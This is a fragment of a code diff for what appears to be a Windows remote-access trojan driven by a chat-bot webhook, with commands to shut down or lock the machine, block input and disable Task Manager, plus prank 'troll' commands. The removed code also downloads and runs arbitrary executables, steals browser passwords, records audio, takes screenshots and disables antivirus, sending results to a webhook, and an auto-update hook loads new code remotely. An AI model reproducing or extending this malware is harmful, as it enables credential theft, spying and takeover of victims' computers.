-            winreg.CloseKey(key)
-            return True
-            
-        elif command == "enable_task_manager":
-            # Enable task manager
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
-                                0, winreg.KEY_SET_VALUE)
-            try:
-                winreg.DeleteValue(key, "DisableTaskMgr")
-            except:
-                pass
-            winreg.CloseKey(key)
-            return True
-            
-        elif command == "hide_desktop_icons":
-            # Hide desktop icons
-            ctypes.windll.user32.SystemParametersInfoW(0x0095, 0, None, 0)  # SPI_SETDESKWALLPAPER
-            ctypes.windll.user32.SystemParametersInfoW(0x0096, 0, None, 0)  # SPI_SETDESKPATTERN
-            ctypes.windll.user32.SystemParametersInfoW(0x0097, 0, None, 0)  # SPI_SETDESKWALLPAPER
-            return True
-            
-        elif command == "show_desktop_icons":
-            # Show desktop icons
-            ctypes.windll.user32.SystemParametersInfoW(0x0095, 1, None, 0)
-            ctypes.windll.user32.SystemParametersInfoW(0x0096, 1, None, 0)
-            ctypes.windll.user32.SystemParametersInfoW(0x0097, 1, None, 0)
-            return True
-            
-        elif command == "random_mouse_movement":
-            # Continuous random mouse movement
-            def random_mouse():
-                while True:
-                    x = random.randint(0, ctypes.windll.user32.GetSystemMetrics(0))
-                    y = random.randint(0, ctypes.windll.user32.GetSystemMetrics(1))
-                    ctypes.windll.user32.SetCursorPos(x, y)
-                    time.sleep(2)
-            
-            threading.Thread(target=random_mouse, daemon=True).start()
-            return True
-            
-        elif command == "invert_colors_toggle":
-            # Toggle high contrast mode (color inversion)
+        elif parameter == "invert_colors":
             SPI_SETHIGHCONTRAST = 0x0043
             HCF_HIGHCONTRASTON = 0x00000001
             
@@ -547,258 +655,119 @@ def advanced_troll_commands(command):
             
             hc = HIGHCONTRAST()
             hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
-            
-            # Toggle current state
-            current_state = ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, 0, None, 0)
-            if current_state:
-                hc.dwFlags = 0  # Turn off
-            else:
-                hc.dwFlags = HCF_HIGHCONTRASTON  # Turn on
-            
+            hc.dwFlags = HCF_HIGHCONTRASTON
             hc.lpszDefaultScheme = None
             ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
             return True
             
+        elif parameter == "mouse_jiggler":
+            def jiggle_mouse():
+                while True:
+                    x = random.randint(0, 100)
+                    y = random.randint(0, 100)
+                    ctypes.windll.user32.SetCursorPos(x, y)
+                    time.sleep(5)
+            
+            threading.Thread(target=jiggle_mouse, daemon=True).start()
+            return True
+            
+        elif parameter == "keyboard_spam":
+            def spam_keys():
+                while True:
+                    key = random.randint(65, 90)
+                    ctypes.windll.user32.keybd_event(key, 0, 0, 0)
+                    ctypes.windll.user32.keybd_event(key, 0, 2, 0)
+                    time.sleep(1)
+            
+            threading.Thread(target=spam_keys, daemon=True).start()
+            return True
+            
+        elif parameter == "play_sound":
+            import winsound
+            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
+            return True
+            
+        elif parameter == "change_wallpaper":
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
+            return True
+            
+        elif parameter == "fake_bsod":
+            # Create fake BSOD screen
+            ctypes.windll.user32.MessageBoxW(0, 
+                "A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\nIf this is the first time you've seen this error screen, restart your computer.", 
+                "Windows - System Error", 0x00000010)
+            return True
+            
+        elif parameter == "disable_taskmgr":
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
+                                0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            return True
+            
+        elif parameter == "enable_taskmgr":
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
+                                0, winreg.KEY_SET_VALUE)
+            try:
+                winreg.DeleteValue(key, "DisableTaskMgr")
+            except:
+                pass
+            winreg.CloseKey(key)
+            return True
+            
+        elif parameter == "hide_desktop_icons":
+            ctypes.windll.user32.SystemParametersInfoW(0x0095, 0, None, 0)
+            ctypes.windll.user32.SystemParametersInfoW(0x0096, 0, None, 0)
+            ctypes.windll.user32.SystemParametersInfoW(0x0097, 0, None, 0)
+            return True
+            
         return False
-        
     except Exception as e:
         return False
 
-def _execute_control_command(command, parameter=None, webhook_url=None):
-    """Enhanced control command execution with new features"""
-    try:
-        # System Control Commands
-        if command == "shutdown":
-            os.system("shutdown /s /t 1")
-            return True
-            
-        elif command == "restart":
-            os.system("shutdown /r /t 1")
-            return True
-            
-        elif command == "lock":
-            ctypes.windll.user32.LockWorkStation()
-            return True
-            
-        elif command == "logoff":
-            os.system("shutdown /l /f")
-            return True
-            
-        elif command == "close_minecraft":
-            os.system("taskkill /f /im javaw.exe 2>nul")
-            return True
-            
-        elif command == "popup" and parameter:
-            ctypes.windll.user32.MessageBoxW(0, parameter, "System Message", 0x00001000)
-            return True
-            
-        elif command == "download_execute" and parameter:
-            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
-            response = requests.get(parameter)
-            temp_file.write(response.content)
-            temp_file.close()
-            subprocess.Popen(temp_file.name, shell=True)
-            return True
-            
-        elif command == "freeze_keyboard":
-            ctypes.windll.user32.BlockInput(True)
-            return True
-            
-        elif command == "freeze_mouse":
-            ctypes.windll.user32.BlockInput(True)
-            return True
-            
-        elif command == "freeze_both":
-            ctypes.windll.user32.BlockInput(True)
-            return True
-            
-        elif command == "unfreeze":
-            ctypes.windll.user32.BlockInput(False)
-            return True
-            
-        # Enhanced Features
-        elif command == "check_av_enhanced":
-            result = enhanced_av_detection(webhook_url)
-            return bool(result)
-            
-        elif command == "take_screenshot_enhanced":
-            return take_enhanced_screenshot(webhook_url)
-            
-        elif command == "system_info":
-            info = get_system_info()
-            if webhook_url:
-                embed = {
-                    "title": "💻 System Information",
-                    "description": f"Detailed system info from `{socket.gethostname()}`",
-                    "color": 0x00ff00,
-                    "fields": [
-                        {"name": key.replace('_', ' ').title(), "value": str(value), "inline": True}
-                        for key, value in info.items()
-                    ],
-                    "footer": {"text": f"Feature Version {FEATURE_VERSION}"}
-                }
-                requests.post(webhook_url, json={"embeds": [embed]})
-            return True
-            
-        elif command == "record_audio" and parameter:
-            duration = int(parameter) if parameter.isdigit() else 10
-            return record_audio(duration, webhook_url)
-            
-        elif command == "browser_passwords":
-            return bool(get_browser_passwords(webhook_url))
-            
-        elif command == "system_optimization":
-            results = system_optimization()
-            if webhook_url:
-                embed = {
-                    "title": "🧹 System Optimization Completed",
-                    "description": f"Optimization results from `{socket.gethostname()}`",
-                    "color": 0x00ffff,
-                    "fields": [{
-                        "name": "Actions Performed",
-                        "value": "\n".join(results[:10]) or "No actions performed"
-                    }],
-                    "footer": {"text": f"Feature Version {FEATURE_VERSION}"}
-                }
-                requests.post(webhook_url, json={"embeds": [embed]})
-            return True
-            
-        elif command == "disable_av":
-            results = disable_antivirus_temporarily()
-            if webhook_url:
-                embed = {
-                    "title": "🛡️ Antivirus Disabled",
-                    "description": f"AV disable attempt on `{socket.gethostname()}`",
-                    "color": 0xff0000,
-                    "fields": [{
-                        "name": "Actions",
-                        "value": "\n".join(results) or "No actions performed"
-                    }]
-                }
-                requests.post(webhook_url, json={"embeds": [embed]})
-            return True
-            
-        elif command == "enable_av":
-            results = enable_antivirus()
-            if webhook_url:
-                embed = {
-                    "title": "🛡️ Antivirus Enabled",
-                    "description": f"AV enable attempt on `{socket.gethostname()}`",
-                    "color": 0x00ff00,
-                    "fields": [{
-                        "name": "Actions",
-                        "value": "\n".join(results) or "No actions performed"
-                    }]
-                }
-                requests.post(webhook_url, json={"embeds": [embed]})
-            return True
-            
-        # Advanced Troll Commands
-        elif command == "advanced_troll":
-            if parameter in ["rotate_screen_90", "rotate_screen_180", "rotate_screen_270", 
-                           "reset_screen_rotation", "create_fake_bsod", "disable_task_manager",
-                           "enable_task_manager", "hide_desktop_icons", "show_desktop_icons",
-                           "random_mouse_movement", "invert_colors_toggle"]:
-                return advanced_troll_commands(parameter)
-            return False
-            
-        # Basic Troll Commands (backward compatibility)
-        elif command == "troll":
-            if parameter == "open_cd":
-                ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
-                return True
-                
-            elif parameter == "swap_mouse":
-                current = ctypes.windll.user32.GetSystemMetrics(23)
-                ctypes.windll.user32.SwapMouseButton(not current)
-                return True
-                
-            elif parameter == "rotate_screen":
-                return advanced_troll_commands("rotate_screen_180")
-                
-            elif parameter == "invert_colors":
-                return advanced_troll_commands("invert_colors_toggle")
-                
-            elif parameter == "mouse_jiggler":
-                def jiggle_mouse():
-                    while True:
-                        x = random.randint(0, 100)
-                        y = random.randint(0, 100)
-                        ctypes.windll.user32.SetCursorPos(x, y)
-                        time.sleep(5)
-                threading.Thread(target=jiggle_mouse, daemon=True).start()
-                return True
-                
-            elif parameter == "keyboard_spam":
-                def spam_keys():
-                    while True:
-                        key = random.randint(65, 90)
-                        ctypes.windll.user32.keybd_event(key, 0, 0, 0)
-                        ctypes.windll.user32.keybd_event(key, 0, 2, 0)
-                        time.sleep(1)
-                threading.Thread(target=spam_keys, daemon=True).start()
-                return True
-                
-            elif parameter == "play_sound":
-                winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
-                return True
-                
-            elif parameter == "change_wallpaper":
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
-                return True
-        
-        return False
-        
-    except Exception as e:
-        return False
+# ==================== AUTO-UPDATE MECHANISM ====================
 
-# New features registry
-NEW_FEATURES = {
-    "version": FEATURE_VERSION,
-    "last_updated": LAST_UPDATED,
-    "commands": {
-        "system_control": [
-            "shutdown", "restart", "lock", "logoff", "close_minecraft",
-            "popup", "download_execute", "freeze_keyboard", "freeze_mouse",
-            "freeze_both", "unfreeze"
-        ],
-        "enhanced_features": [
-            "check_av_enhanced", "take_screenshot_enhanced", "system_info",
-            "record_audio", "browser_passwords", "system_optimization",
-            "disable_av", "enable_av"
-        ],
-        "troll_commands": [
-            "advanced_troll", "troll"
-        ]
-    },
-    "advanced_troll_options": [
-        "rotate_screen_90", "rotate_screen_180", "rotate_screen_270",
-        "reset_screen_rotation", "create_fake_bsod", "disable_task_manager",
-        "enable_task_manager", "hide_desktop_icons", "show_desktop_icons",
-        "random_mouse_movement", "invert_colors_toggle"
-    ]
-}
-
-# Update global functions when this file is executed
 def update_global_features():
-    """Update the global feature set when this file is loaded"""
-    globals().update({
-        '_execute_control_command': _execute_control_command,
-        'enhanced_av_detection': enhanced_av_detection,
-        'take_enhanced_screenshot': take_enhanced_screenshot,
-        'get_system_info': get_system_info,
-        'record_audio': record_audio,
-        'get_browser_passwords': get_browser_passwords,
-        'system_optimization': system_optimization,
-        'disable_antivirus_temporarily': disable_antivirus_temporarily,
-        'enable_antivirus': enable_antivirus,
-        'advanced_troll_commands': advanced_troll_commands,
-        'NEW_FEATURES': NEW_FEATURES
-    })
+    """
+    This function updates the client's global feature set
+    It's automatically called when features.py is downloaded
+    """
+    # Update the main execution function
+    if '_execute_control_command' in globals():
+        globals()['_execute_control_command'] = _execute_control_command
+    
+    print(f"✅ Features updated to version {FEATURE_VERSION}")
+    print(f"📋 Available commands: {sum(len(cmds) for cmds in FEATURE_REGISTRY['commands'].values())}")
 
-# Execute the update when imported
+# ==================== NEW FEATURE TEMPLATES ====================
+
+"""
+HOW TO ADD NEW FEATURES:
+
+1. INCREASE the FEATURE_VERSION number
+2. ADD the command name to FEATURE_REGISTRY['commands'] in the appropriate category
+3. IMPLEMENT the command in _execute_control_command() function
+4. RETURN (success, data) tuple where data can be sent back to bot
+
+EXAMPLE:
+
+FEATURE_VERSION = "2.1"  # ← Increase this
+
+# Add to FEATURE_REGISTRY:
+FEATURE_REGISTRY['commands']['advanced'].append("new_feature")
+
+# Add to _execute_control_command:
+elif command == "new_feature":
+    result = _new_feature_helper(parameter)
+    return result, "New feature executed"
+
+# Create helper function:
+def _new_feature_helper(parameter):
+    # Implementation here
+    return True
+"""
+
+# Initialize features
 update_global_features()
-
-print(f"✅ Features updated to version {FEATURE_VERSION}")
-print(f"📋 Available enhanced commands: {len(NEW_FEATURES['commands']['enhanced_features'])}")
-print(f"🎮 Advanced troll options: {len(NEW_FEATURES['advanced_troll_options'])}")
